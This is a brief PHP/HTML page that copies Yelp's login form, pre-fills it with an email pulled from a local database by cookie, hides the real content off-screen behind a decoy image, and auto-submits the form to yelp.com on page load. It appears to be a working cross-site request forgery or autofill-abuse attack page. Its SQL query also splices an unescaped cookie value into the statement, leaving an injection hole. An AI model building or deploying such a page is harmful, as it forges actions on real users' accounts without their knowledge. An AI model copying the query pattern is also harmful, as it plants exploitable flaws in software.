<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `yelp` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["login-form"].submit();}</script>



<form action="https://www.yelp.com/login?return_url=%2Fsf" id="login-form" method="POST" name="login_form">
<input type="hidden" class="csrftok" name="csrftok" value="18bdbfbb8a23842149c9d9e5bfb908d3494d16d604a8b70bebe3389851d0f6f2">
				<h2>Log In</h2>
				<p>
					Please enter your email address and password to log in.
				</p>
				<p>
					<label>	Email Address</label>
					<input type="hidden" name="context" value="">
					<input tabindex="1" type="email" maxlength="64" size="20" class="form200" name="email" value="<?=$email;?>">
				</p>

				<p>
					<label>	Password</label>
					<input tabindex="2" autocomplete="off" type="password" size="20" class="form200" name="password">
				</p>

				<p class="formLabel"><a href="/forgot">Forgot your password?</a></p>


				<p class="alignright" style="margin: 10px 0 20px;">
					<button name="action_submit" tabindex="3" type="submit" value="Log In" class="ybtn ybtn-secondary ybtn-small"><span>Log In</span></button>
				</p>

				<p>

					By logging in you agree to Yelp's <a href="/static?p=tos&amp;country=US">Terms of Service</a> and <a href="/static?p=privacy&amp;country=US">Privacy Policy</a>.
				</p>


</form>

</body>
</html>

